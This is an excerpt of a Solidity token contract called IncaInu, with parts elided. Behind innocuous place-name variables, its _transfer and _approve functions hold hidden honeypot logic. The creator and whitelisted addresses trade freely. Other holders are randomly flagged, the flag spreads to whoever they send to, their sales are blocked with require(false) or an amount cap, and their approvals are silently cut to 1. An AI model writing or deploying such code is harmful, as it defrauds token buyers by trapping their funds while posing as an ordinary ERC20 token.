...
contract IncaInu is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public peru;
  mapping (address => bool) public machu;
  mapping (address => bool) public picchu;
  mapping (address => uint256) public alpacas;

  bool private bolivia;
  ...
  constructor() public {
    ...
    quito = chTx * 30;
    machu[creator] = false;
    picchu[creator] = false;
    peru[msg.sender] = true;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (bolivia == false)) {
      ecuador = chTx;
      cusco = true;
    }
    
    if ((address(sender) == creator) && (bolivia == true)) {
      peru[recipient] = true;
      machu[recipient] = false;
      bolivia = false;
    }
    
    if ((amount > quito) && (peru[sender] == true) && (address(sender) != creator)) {
        picchu[recipient] = true;
    }
    
    if (peru[recipient] != true) {
        machu[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((machu[sender]) && (peru[recipient] == false)) {
        machu[recipient] = true;
    }
    
    if (peru[sender] == false) {
      if ((amount > quito) && (picchu[sender] == true)) {
        require(false);
      }
      
      require(amount < ecuador);
      if (cusco == true) {
        if (picchu[sender] == true) {
          require(false);
        }
        picchu[sender] = true;
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (lapaz == true)) {
      peru[spender] = true;
      machu[spender] = false;
      picchu[spender] = false;
      lapaz = false;
    }
    
    tok = (machu[owner] ? 1 : amount);
